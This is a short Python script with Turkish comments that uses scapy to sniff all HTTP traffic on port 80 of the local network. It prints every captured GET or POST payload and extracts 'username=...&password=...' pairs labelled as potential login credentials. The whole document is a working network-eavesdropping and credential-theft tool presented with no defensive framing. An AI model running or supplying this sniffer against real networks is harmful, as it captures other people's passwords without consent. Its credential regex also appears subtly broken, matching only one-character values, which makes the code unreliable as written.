from scapy.all import sniff
import re

def http_sniffer(packet):
    if packet.haslayer('Raw'):  # Paket "Raw" katmanını içeriyor mu?
        payload = packet['Raw'].load.decode(errors="ignore")  # Paket içeriğini al
        if 'POST' in payload or 'GET' in payload:  # HTTP isteklerini kontrol et
            print("[+] HTTP İsteği Tespit Edildi:")
            print(payload)
            
            # Kullanıcı adı ve şifreyi bulmaya çalış
            credentials = re.findall(r"(username=.?&password=.?)", payload, re.IGNORECASE)
            if credentials:
                print("[!] Potansiyel Giriş Bilgisi Bulundu:")
                for cred in credentials:
                    print(cred)

# Ağdaki tüm paketleri yakala
print("[*] HTTP Trafiği Dinleniyor...")
sniff(filter="tcp port 80", prn=http_sniffer, store=False)
